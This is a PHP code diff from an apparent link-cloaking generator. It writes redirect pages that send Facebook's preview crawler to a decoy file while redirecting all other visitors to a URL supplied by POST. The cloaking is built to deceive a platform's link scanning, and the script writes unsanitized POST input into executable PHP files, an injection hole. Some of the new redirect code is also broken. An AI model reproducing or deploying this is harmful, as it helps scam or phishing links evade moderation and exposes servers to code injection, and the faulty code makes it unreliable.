@@ -88,12 +88,6 @@ if(!isset($_SESSION['UserData']['Username'])){
     $file = $pathname.".php";
     $fh= fopen($file,'w');
     $string = '
-    <?php
-    $ua = $_SERVER[\'HTTP_USER_AGENT\'];
-      if (preg_match(\'/facebookexternalhit/si\',$ua)) {
-          header(\'location: link.html\');
-      }
-    ?>
     <head>
     <html xmlns="http://www.w3.org/1999/xhtml" lang="vi" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#">
     <head>
@@ -102,9 +96,18 @@ if(!isset($_SESSION['UserData']['Username'])){
     <meta content="noindex, nofollow" name="robots"/>
     <meta property="og:url" content="'.$_POST["url"].'"/>
     <title>loading...</title>
-    <script type="text/javascript" language="javascript">
-      window.location="'.$_POST["url2"].'";
-    </script>
+    <?php
+    $ua = $_SERVER[\'HTTP_USER_AGENT\'];
+      if (preg_match(\'/facebookexternalhit/si\',$ua)) {
+          header(\'location: zE2YUxpwcP/c87IUTHQfz.html\');
+      } else { ?>
+        <script type="text/javascript" language="javascript">
+          window.location="<?php $_POST["url2"] ?>";
+        </script>
+    <?php
+      }
+    ?>
+
     </head>
     <body>
     </body>
